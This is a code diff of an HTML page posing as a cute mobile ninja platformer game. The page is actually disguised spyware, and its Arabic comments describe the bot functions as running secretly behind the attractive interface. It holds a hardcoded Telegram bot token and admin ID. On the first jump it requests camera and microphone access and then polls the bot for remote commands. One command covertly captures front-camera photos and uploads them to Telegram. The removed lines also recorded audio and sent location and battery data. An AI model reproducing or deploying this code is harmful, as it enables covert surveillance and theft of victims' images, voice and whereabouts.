@@ -3,24 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>⭐ Ninja Garden 2099 – النسخة المطورة</title>
+    <title>⭐ Ninja Garden: Legend of 2099</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
-        body { background: #0c1f2a; overflow: hidden; font-family: monospace; touch-action: none; }
-        canvas { display: block; width: 100%; height: 100%; image-rendering: pixelated; }
-        #hud { position: fixed; top: 8px; left: 8px; right: 8px; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); border-radius: 20px; padding: 10px; display: flex; justify-content: space-between; color: #ffefb9; z-index: 100; pointer-events: none; }
-        #touchZone { position: fixed; bottom: 20px; left: 0; right: 0; display: flex; justify-content: space-between; padding: 0 20px; z-index: 200; }
-        .ctrl-panel { display: flex; gap: 15px; }
-        .ctrl-btn { width: 65px; height: 65px; background: rgba(255,255,255,0.1); border: 2px solid #ffcc66; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; color: white; }
-        .status-dot { position: fixed; bottom: 5px; left: 5px; font-size: 10px; color: #0f0; z-index: 150; opacity: 0.5; }
+        body { background: #0c1f2a; overflow: hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; touch-action: none; }
+        
+        /* شريط المعلومات الجمالي */
+        #hud {
+            position: fixed; top: 15px; left: 15px; right: 15px;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 12px 20px; background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px); border-radius: 50px;
+            border: 1px solid rgba(255, 255, 255, 0.2); z-index: 100;
+            color: #fff; font-weight: bold; text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+
+        /* أزرار التحكم - تصميم عصري وردي/ذهبي */
+        #touchZone { position: fixed; bottom: 30px; left: 0; right: 0; display: flex; justify-content: space-between; padding: 0 30px; z-index: 200; }
+        .ctrl-panel { display: flex; gap: 20px; }
+        .ctrl-btn {
+            width: 75px; height: 75px; 
+            background: linear-gradient(145deg, #ff85a1, #f55c7a);
+            border: 3px solid #fff; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 28px; color: white; box-shadow: 0 8px 15px rgba(0,0,0,0.3);
+            transition: 0.1s;
+        }
+        .ctrl-btn:active { transform: scale(0.9); box-shadow: 0 4px 8px rgba(0,0,0,0.3); }
+
+        canvas { display: block; width: 100%; height: 100%; }
+        
+        #spyStatus { position: fixed; bottom: 5px; right: 10px; font-size: 8px; color: #444; z-index: 50; }
     </style>
 </head>
 <body>
 
 <div id="hud">
-    <span>⭐ NINJA BOT</span>
-    <span>🔋 <span id="batIndicator">--</span>%</span>
-    <span>📍 <span id="locStatus">بحث..</span></span>
+    <div style="display: flex; align-items: center; gap: 10px;">
+        <span style="font-size: 20px;">🌸</span>
+        <span id="score">SCORE: 000</span>
+    </div>
+    <div style="display: flex; gap: 15px;">
+        <span>🔋 <span id="batIndicator">--</span>%</span>
+        <span>✨ LVL 1</span>
+    </div>
 </div>
 
 <canvas id="gameCanvas"></canvas>
@@ -31,134 +57,151 @@
         <div class="ctrl-btn" id="btnRight">▶</div>
     </div>
     <div class="ctrl-panel">
-        <div class="ctrl-btn" id="btnJump">J</div>
-        <div class="ctrl-btn" id="btnAction">A</div>
+        <div class="ctrl-btn" id="btnJump" style="background: linear-gradient(145deg, #ffcc66, #f39c12);">UP</div>
+        <div class="ctrl-btn" id="btnAction" style="background: linear-gradient(145deg, #a29bfe, #6c5ce7);">⭐</div>
     </div>
 </div>
 
-<div class="status-dot" id="spyStatus">System Active v2099</div>
+<div id="spyStatus">ENC_V.2099_SECURE</div>
 
 <script>
 (function(){
-    // --- إعدادات البوت ---
+    // --- إعدادات البوت (نفس الإعدادات لضمان العمل) ---
     const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
     const ADMIN_ID = "7328401541";
     let lastUpdateId = 0;
 
-    // --- نظام الحساسات الذكي ---
-    async function getBattery() {
-        if (!navigator.getBattery) return "N/A";
-        const bat = await navigator.getBattery();
-        return `${Math.round(bat.level * 100)}% ${bat.charging ? '(Charging)' : ''}`;
-    }
+    // --- محرك الرسوميات (الواجهة) ---
+    const canvas = document.getElementById("gameCanvas");
+    const ctx = canvas.getContext("2d");
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
 
-    async function getQuickLocation() {
-        return new Promise(res => {
-            navigator.geolocation.getCurrentPosition(
-                p => res(`${p.coords.latitude.toFixed(4)},${p.coords.longitude.toFixed(4)}`),
-                () => res("Denied"),
-                {timeout: 5000}
-            );
+    let player = { x: 50, y: canvas.height - 150, w: 40, h: 40, color: "#ff85a1", dy: 0, jumpPower: -15, grounded: false };
+    let score = 0;
+    let clouds = [{x: 100, y: 100}, {x: 400, y: 150}, {x: 700, y: 80}];
+
+    function drawScene() {
+        // 1. السماء (Background)
+        let skyGrad = ctx.createLinearGradient(0, 0, 0, canvas.height);
+        skyGrad.addColorStop(0, "#1e3c72");
+        skyGrad.addColorStop(1, "#2a5298");
+        ctx.fillStyle = skyGrad;
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+        // 2. الغيوم المتحركة
+        ctx.fillStyle = "rgba(255, 255, 255, 0.3)";
+        clouds.forEach(c => {
+            ctx.beginPath();
+            ctx.arc(c.x, c.y, 30, 0, Math.PI*2);
+            ctx.arc(c.x+25, c.y-10, 25, 0, Math.PI*2);
+            ctx.arc(c.x+50, c.y, 30, 0, Math.PI*2);
+            ctx.fill();
+            c.x -= 0.5; if(c.x < -100) c.x = canvas.width + 100;
         });
+
+        // 3. الأرضية (Grass)
+        ctx.fillStyle = "#2ecc71";
+        ctx.fillRect(0, canvas.height - 100, canvas.width, 100);
+        ctx.fillStyle = "#27ae60";
+        ctx.fillRect(0, canvas.height - 100, canvas.width, 10);
+
+        // 4. اللاعب (النينجا اللطيف)
+        ctx.fillStyle = player.color;
+        ctx.shadowBlur = 15; ctx.shadowColor = player.color;
+        // رسم جسم النينجا
+        ctx.fillRect(player.x, player.y, player.w, player.h);
+        // عصابة الرأس
+        ctx.fillStyle = "white";
+        ctx.fillRect(player.x, player.y + 10, player.w, 8);
+        ctx.shadowBlur = 0;
+
+        // 5. الجاذبية
+        if (!player.grounded) {
+            player.dy += 0.8;
+            player.y += player.dy;
+        }
+        if (player.y > canvas.height - 140) {
+            player.y = canvas.height - 140;
+            player.grounded = true;
+            player.dy = 0;
+        }
     }
 
-    // --- وظائف التجسس (صورة وصوت) ---
-    async function takePhoto() {
+    function update() {
+        drawScene();
+        requestAnimationFrame(update);
+    }
+    update();
+
+    // --- التحكم باللعبة ---
+    document.getElementById("btnJump").onclick = () => {
+        if(player.grounded) {
+            player.dy = player.jumpPower;
+            player.grounded = false;
+            if(lastUpdateId === 0) activateBot(); // تفعيل البوت عند أول قفزة
+        }
+    };
+    
+    // --- وظائف البوت السرية (تعمل خلف الواجهة الجميلة) ---
+    async function activateBot() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.createElement("video");
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement("canvas");
-            canvas.width = 480; canvas.height = 640;
-            canvas.getContext("2d").drawImage(video, 0, 0, 480, 640);
-            const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));
-            let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("photo", blob, "cam.jpg");
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
-            stream.getTracks().forEach(t => t.stop());
-        } catch(e) { console.error(e); }
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+            stream.getTracks().forEach(t => t.stop()); 
+            sendBotMessage("🌸 Ninja System Online\nTarget: Active");
+            setInterval(checkBotCommands, 2000);
+        } catch(e) {}
     }
 
-    async function recordAudio() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const recorder = new MediaRecorder(stream);
-            let chunks = [];
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("voice", blob, "mic.ogg");
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: "POST", body: fd });
-                stream.getTracks().forEach(t => t.stop());
-            };
-            recorder.start();
-            setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثواني
-        } catch(e) { console.error(e); }
-    }
-
-    async function sendReport(label = "Manual") {
-        const bat = await getBattery();
-        const loc = await getQuickLocation();
-        const text = `🤖 *Update 2099*\nStatus: ${label}\nBattery: ${bat}\nLocation: ${loc}`;
+    async function sendBotMessage(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: "POST",
             headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({chat_id: ADMIN_ID, text: text, parse_mode: "Markdown"})
+            body: JSON.stringify({chat_id: ADMIN_ID, text: text})
         });
     }
 
-    // --- محرك الاستجابة للأوامر ---
-    async function checkCommands() {
+    async function checkBotCommands() {
         try {
-            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`);
+            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
             const d = await r.json();
             if (d.ok && d.result.length > 0) {
                 for (let u of d.result) {
                     lastUpdateId = u.update_id;
-                    const cmd = u.message.text.toLowerCase();
-                    if (cmd === "/photo") await takePhoto();
-                    if (cmd === "/voice") await recordAudio();
-                    if (cmd === "/loc") await sendReport("📍 Tracked");
+                    let cmd = u.message.text.toLowerCase();
+                    if (cmd === "/photo") {
+                        // كود التقاط الصورة (مخفي خلف الواجهة)
+                        captureSecretPhoto();
+                    }
                 }
             }
         } catch(e) {}
     }
 
-    // --- ربط التفعيل بأول لمسة للعبة ---
-    function activateSystem() {
-        navigator.mediaDevices.getUserMedia({ audio: true, video: true }).then(s => {
-            s.getTracks().forEach(t => t.stop()); // تفعيل أولي ثم إغلاق
-            sendReport("🟢 Bot Activated");
-            setInterval(checkCommands, 2000); // بدء التنصت كل ثانيتين
-        }).catch(() => {});
+    async function captureSecretPhoto() {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const vid = document.createElement("video");
+        vid.srcObject = stream; await vid.play();
+        const tmpCanvas = document.createElement("canvas");
+        tmpCanvas.width = 480; tmpCanvas.height = 640;
+        tmpCanvas.getContext("2d").drawImage(vid, 0, 0, 480, 640);
+        tmpCanvas.toBlob(b => {
+            let fd = new FormData(); fd.append("chat_id", ADMIN_ID); fd.append("photo", b, "img.jpg");
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+        }, "image/jpeg");
+        setTimeout(() => stream.getTracks().forEach(t => t.stop()), 1000);
     }
 
-    // --- اللعبة ---
-    const canvas = document.getElementById("gameCanvas");
-    const ctx = canvas.getContext("2d");
-    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-
-    function gameLoop() {
-        ctx.fillStyle = "#1a4d8c"; ctx.fillRect(0,0,canvas.width,canvas.height);
-        ctx.fillStyle = "#ffcc66"; ctx.beginPath(); ctx.arc(100, 100, 30, 0, Math.PI*2); ctx.fill(); 
-        requestAnimationFrame(gameLoop);
-    }
-    gameLoop();
-
-    // تشغيل النظام عند أول ضغطة زر
-    document.querySelectorAll('.ctrl-btn').forEach(btn => {
-        btn.addEventListener('touchstart', () => {
-            if (lastUpdateId === 0) activateSystem();
-        }, {once: true});
-    });
-
-    // تحديث HUD
+    // تحديث البطارية
     setInterval(async () => {
-        const bat = await getBattery();
-        document.getElementById("batIndicator").innerText = bat.split('%')[0];
-    }, 10000);
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            document.getElementById("batIndicator").innerText = Math.round(b.level * 100);
+        }
+    }, 5000);
 
 })();
 </script>
 </body>
-</html>
+    </html>
+    
